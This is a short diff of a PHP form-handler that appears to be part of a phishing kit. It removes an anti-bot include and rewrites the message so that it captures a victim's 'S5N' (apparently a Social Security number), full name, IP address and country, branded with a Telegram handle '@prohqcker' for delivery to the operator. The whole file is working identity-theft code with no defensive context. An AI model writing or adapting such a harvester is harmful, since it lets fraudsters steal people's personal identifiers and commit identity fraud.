@@ -1,5 +1,4 @@
 <?php
-require("antibots.php");
 require("config.php");
 include('me.php');
    $country = visitor_country();
@@ -8,8 +7,9 @@ $Port = getenv("REMOTE_PORT");
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $adddate=date("D M d, Y g:i a");
 $subject = "Telegram ID: @prohqcker**";
-$message = "**Telegram ID: @prohqcker *BOK CODE 2***+++\n";
-$message .= "CODE 2 : ".$_POST['1']."\n";
+$message = "**Telegram ID: @prohqcker *S5N CODE 1***+++\n";
+$message .= "S5N : ".$_POST['1']."\n";
+$message .= "FULL NAME  : ".$_POST['2']."\n";
 $message .= "User-!P : ".$ip."\n";
 $message .= "Country : ".$country."\n\n";
 $message .= "----------------------------------------\n";
